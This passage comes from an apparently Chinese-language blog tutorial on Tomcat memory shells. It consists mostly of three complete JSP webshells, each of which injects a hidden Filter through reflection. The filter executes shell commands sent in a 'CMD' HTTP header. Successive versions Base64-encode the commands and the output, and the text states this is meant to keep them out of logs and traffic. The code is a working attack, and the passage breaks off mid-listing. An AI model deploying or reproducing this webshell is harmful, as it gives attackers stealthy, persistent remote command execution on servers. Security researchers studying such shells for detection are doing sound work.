class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-comment">// 从 Header 中读取 CMD</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> ((HttpServletRequest) servletRequest).getHeader(<span class="hljs-string">&quot;CMD&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd == <span class="hljs-literal">null</span> || cmd.trim().isEmpty()) &#123;<br>                filterChain.doFilter(servletRequest, servletResponse); <span class="hljs-comment">// 如果没有 CMD 头，放行请求,不影响正常业务</span><br>            &#125;<br><br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>            <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                isLinux = <span class="hljs-literal">false</span>;<br>            &#125;<br>            String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\a&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>            out.println(output);<br>            System.out.println(<span class="hljs-string">&quot;Shellfilter 执行命令结果: &quot;</span> + output);<br>            out.flush();<br>            out.close();<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">//拿到standardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">applicationField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span>  (ApplicationContext) applicationField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span>  (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//设置filterDef</span><br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilterClass(Shellfilter.class.getName());<br>    filterDef.setFilterName(<span class="hljs-string">&quot;Shellfilter&quot;</span>);<br>    filterDef.setFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Shellfilter</span>());<br>    standardContext.addFilterDef(filterDef);<br><br>    <span class="hljs-comment">//设置filterMap</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.setFilterName(<span class="hljs-string">&quot;Shellfilter&quot;</span>);<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>); <span class="hljs-comment">//设置要映射的url</span><br>    filterMap.setDispatcher(DispatcherType.REQUEST.name()); <span class="hljs-comment">//设置分派类型,REQUEST表示普通的 HTTP 请求</span><br>    standardContext.addFilterMap(filterMap);<br><br>    <span class="hljs-comment">//将standardContext和filterDef放到filterConfig中</span><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">configclass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">configconstructor</span> <span class="hljs-operator">=</span> configclass.getDeclaredConstructor(Context.class,FilterDef.class);<br>    configconstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">FilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (FilterConfig) configconstructor.newInstance(standardContext,filterDef);<br><br>    <span class="hljs-comment">//反射获取filterConfig</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">configsfield</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    configsfield.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) configsfield.get(standardContext);<br>    filterConfigs.put(<span class="hljs-string">&quot;Shellfilter&quot;</span>,filterConfig);<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p><img src="/mdimg/javamemshell1/1758690685112-b76c9a5c-b54e-4332-899c-25fd647a13aa.png" srcset="/img/loading.gif" lazyload></p>
<p>不带CMD 的header访问正常</p>
<p>带CMD时</p>
<p><img src="/mdimg/javamemshell1/1758690723158-b255ff33-3304-44e8-9145-4025fa2a8c65.png" srcset="/img/loading.gif" lazyload></p>
<ol start="2">
<li>再进一步增加隐蔽性，可以对参数进行编码， 避免明文命令出现在日志、流量包中</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Base64&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;shell&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shellfilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-comment">//只处理http请求</span><br>            <span class="hljs-keyword">if</span> (!(servletRequest <span class="hljs-keyword">instanceof</span> HttpServletRequest)) &#123;<br>                filterChain.doFilter(servletRequest, servletResponse);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">encodedCmd</span> <span class="hljs-operator">=</span> req.getHeader(<span class="hljs-string">&quot;CMD&quot;</span>); <span class="hljs-comment">// 接收 Base64 编码的命令</span><br>            <span class="hljs-comment">//为空时放行，不影响正常业务</span><br>            <span class="hljs-keyword">if</span> (encodedCmd == <span class="hljs-literal">null</span> || encodedCmd.trim().isEmpty()) &#123;<br>                filterChain.doFilter(servletRequest, servletResponse);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br><br>            <span class="hljs-comment">// Base64 解码</span><br>            <span class="hljs-type">byte</span>[] decodedBytes = Base64.getDecoder().decode(encodedCmd);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decodedBytes).trim();<br><br>            <span class="hljs-keyword">if</span> (cmd.isEmpty()) &#123;<br>                filterChain.doFilter(servletRequest, servletResponse);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br><br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>            <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                isLinux = <span class="hljs-literal">false</span>;<br>            &#125;<br>            String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\a&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>            out.println(output);<br>            System.out.println(<span class="hljs-string">&quot;Shellfilter 执行命令结果: &quot;</span> + output);<br>            out.flush();<br>            out.close();<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">//拿到standardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">applicationField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span>  (ApplicationContext) applicationField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span>  (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//设置filterDef</span><br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilterClass(Shellfilter.class.getName());<br>    filterDef.setFilterName(<span class="hljs-string">&quot;Shellfilter&quot;</span>);<br>    filterDef.setFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Shellfilter</span>());<br>    standardContext.addFilterDef(filterDef);<br><br>    <span class="hljs-comment">//设置filterMap</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.setFilterName(<span class="hljs-string">&quot;Shellfilter&quot;</span>);<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>); <span class="hljs-comment">//设置要映射的url</span><br>    filterMap.setDispatcher(DispatcherType.REQUEST.name()); <span class="hljs-comment">//设置分派类型,REQUEST表示普通的 HTTP 请求</span><br>    standardContext.addFilterMap(filterMap);<br><br>    <span class="hljs-comment">//将standardContext和filterDef放到filterConfig中</span><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">configclass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">configconstructor</span> <span class="hljs-operator">=</span> configclass.getDeclaredConstructor(Context.class,FilterDef.class);<br>    configconstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">FilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (FilterConfig) configconstructor.newInstance(standardContext,filterDef);<br><br>    <span class="hljs-comment">//反射获取filterConfig</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">configsfield</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    configsfield.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) configsfield.get(standardContext);<br>    filterConfigs.put(<span class="hljs-string">&quot;Shellfilter&quot;</span>,filterConfig);<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p><img src="/mdimg/javamemshell1/1758690966147-b450e223-40ca-40c2-8a71-920185f1efc2.png" srcset="/img/loading.gif" lazyload></p>
<ol start="3">
<li>再进一步增加隐蔽性，可以对命令执行的回显也进行编码</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Base64&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;shell&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shellfilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-comment">//只处理http请求</span><br>            <span class="hljs-keyword">if</span> (!(servletRequest <span class="hljs-keyword">instanceof</span> HttpServletRequest)) &#123;<br>                filterChain.doFilter(servletRequest, servletResponse);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">encodedCmd</span> <span class="hljs-operator">=</span> req.getHeader(<span class="hljs-string">&quot;CMD&quot;</span>); <span class="hljs-comment">// 接收 Base64 编码的命令</span><br>            <span class="hljs-comment">//为空时放行，不影响正常业务</span><br>            <span class="hljs-keyword">if</span> (encodedCmd == <span class="hljs-literal">null</span> || encodedCmd.trim().isEmpty()) &#123;<br>                filterChain.doFilter(servletRequest, servletResponse);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br><br>            <span class="hljs-comment">// Base64 解码</span><br>            <span class="hljs-type">byte</span>[] decodedBytes = Base64.getDecoder().decode(encodedCmd);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decodedBytes).trim();<br><br>            <span class="hljs-keyword">if</span> (cmd.isEmpty()) &#123;<br>                filterChain.doFilter(servletRequest, servletResponse);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br><br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>            <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                isLinux = <span class="hljs-literal">false</span>;<br>            &#125;<br>            String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\a&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">bs64output</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(output.getBytes());<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>            out.println(bs64output);<br>            System.out.println(<span class="hljs-string">&quot;Shellfilter 执行命令结果: &quot;</span> + output);<br>            out.flush();<br>            out.close();<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">//拿到standardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">applicationField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span>  (ApplicationContext) applicationField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span 